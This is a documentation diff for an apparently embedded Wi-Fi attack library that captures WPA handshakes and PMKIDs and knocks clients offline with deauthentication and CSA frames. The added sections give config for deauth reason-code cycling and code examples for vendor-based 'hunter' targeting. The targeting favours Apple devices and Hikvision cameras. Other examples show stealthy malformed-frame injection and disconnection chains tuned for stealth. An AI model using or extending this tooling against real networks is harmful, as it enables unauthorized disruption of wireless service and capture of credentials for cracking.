@@ -198,7 +198,10 @@ Initialize the engine. Returns `OK` on success or an `Error` code on failure. Mu
 
 ```cpp
 struct Config {
-    uint16_t hop_dwell_ms           = 200;   // Time spent on each channel (ms)
+    uint16_t hop_dwell_ms           = 200;   // Static time spent on each channel (ms)
+    bool     smart_hopping          = true;  // Dynamic channel dwell time based on traffic
+    uint16_t hop_min_dwell_ms       = 50;    // Minimum dwell if no traffic is seen
+    uint16_t hop_max_dwell_ms       = 400;   // Maximum dwell if traffic is active
     uint32_t m1_lock_ms             = 800;   // How long to stay on channel after seeing M1
     uint32_t fish_timeout_ms        = 2000;  // Timeout per PMKID association attempt
     uint8_t  fish_max_retries       = 2;     // PMKID retries before pivoting to CSA
@@ -207,7 +210,7 @@ struct Config {
     uint8_t  deauth_burst_count     = 16;    // Frames per standalone deauth burst
     uint8_t  csa_deauth_count       = 15;    // Deauth frames appended after CSA burst
     uint16_t probe_aggr_interval_s  = 30;    // Seconds between re-attacking the same AP
-    uint32_t session_timeout_ms     = 60000; // How long orphaned M1 sessions live in RAM
+    uint32_t session_timeout_ms     = 60000; // How long orphaned sessions live in RAM
     bool     capture_half_handshakes = false; // Fire callback on M2-only captures and pivot to active attack
     bool     skip_immune_networks   = true;  // Skip pure WPA3 / PMF-Required networks
     uint8_t  capture_filter         = LOG_FILTER_HANDSHAKES | LOG_FILTER_PROBES;
@@ -216,6 +219,7 @@ struct Config {
     bool     unicast_deauth         = true;  // Send deauth to known client MAC instead of broadcast
     uint32_t probe_hidden_interval_ms = 0;   // How often to probe hidden APs for SSID (0 = disabled, opt-in)
     uint8_t  deauth_reason          = 7;     // 802.11 reason code in deauth frames
+    bool     deauth_reason_cycling  = true;  // Cycle through effective reason codes (fuzzing)
     // ── Frame capture
     bool     capture_group_keys     = false; // Fire eapolCb(CAP_EAPOL_GROUP) on GTK rotation frames
     // ── Filtering
@@ -224,9 +228,86 @@ struct Config {
     uint8_t  sta_filter[6]          = {};    // Only record EAPOL from this client MAC (zero = no filter)
     char     ssid_filter[33]        = {};    // Only cache APs matching this SSID (empty = no filter)
     bool     ssid_filter_exact      = true;  // True = exact match, false = substring match
-    uint8_t  enc_filter_mask        = 0xFF;  // Bitmask of enc types to cache (bit N = enc type N, 0xFF = all)
+    uint8_t  enc_filter_mask        = 0xFF;  // Bitmask of enc types to cache
     bool     require_active_clients = false; // Skip attack initiation if no active clients seen on AP
 };
+```
+
+### Advanced Features
+
+#### Autonomous Hunter (Fingerprint-Aware Targeting)
+
+Prioritize specific device vendors during `autoTarget` using the built-in OUI database:
+
+```cpp
+// 1. Define your targeting policy
+int hunterScore(const ApRecord &ap, const char *vendor) {
+    int score = ap.rssi; // Start with signal strength
+    
+    // Prioritize high-value targets
+    if (strstr(vendor, "Apple"))   score += 50;
+    if (strstr(vendor, "Hikvision")) score += 80; // Security Cameras
+    
+    // Ignore uninteresting noise
+    if (ap.flags.is_hidden) score -= 100;
+    
+    return score;
+}
+
+void setup() {
+    engine.begin();
+    engine.setTargetScoreCallback(hunterScore);
+    engine.setAutoTarget(true);
+    engine.startHopping();
+}
+```
+
+#### Custom Frame Injection & Fuzzing
+
+Inject arbitrary 802.11 frames with precise channel control:
+
+```cpp
+// Malformed Probe Request for fuzzing
+uint8_t malformedFrame[] = { 0x40, 0x00, ... };
+
+void loop() {
+    engine.tick();
+    
+    // Inject immediately on channel 6, locking the hopper for 100ms
+    engine.injectCustomFrame(malformedFrame, sizeof(malformedFrame), 6, 100);
+    
+    // Queue for stealthy injection (fires only when hopper lands on ch 11)
+    engine.injectCustomFrame(malformedFrame, sizeof(malformedFrame), 11, 0, true);
+}
+```
+
+#### Disconnection Strategy
+
+Optimize stealth by chaining attack methods sequentially:
+
+```cpp
+void setup() {
+    Config cfg;
+    engine.begin(cfg);
+    
+    // Attempt CSA (Stealthy) first, fallback to Deauth only if needed
+    engine.setDisconnectionStrategy(STRATEGY_AUTO_FALLBACK);
+    
+    engine.setAttackMask(ATTACK_CSA | ATTACK_DEAUTH);
+}
+```
+
+#### 802.11u Interworking Discovery
+
+Discover the physical venue context of public networks:
+
+```cpp
+void onAp(const ApRecord &ap) {
+    if (ap.venue_group != 0) {
+        Serial.printf("Venue: Group %d, Type %d\n", ap.venue_group, ap.venue_type);
+        // e.g., Group 2 (Education), Type 8 (University)
+    }
+}
 ```
 
 #### Callbacks
@@ -609,9 +690,9 @@ void onHandshake(const HandshakeRecord &rec) {
     PcapngFileLogger::append(SD, "/captures.pcapng", rec);
 }
 
-void onPacket(const uint8_t* payload, uint16_t len, int8_t rssi, uint32_t ts) {
+void onPacket(const uint8_t* payload, uint16_t len, int8_t rssi, uint8_t channel, uint32_t ts) {
     // Log raw 802.11 frames
-    PcapngFileLogger::appendPacket(SD, "/intel.pcapng", payload, len, rssi, ts);
+    PcapngFileLogger::appendPacket(SD, "/intel.pcapng", payload, len, rssi, channel, ts);
 }
 
 void setup() {
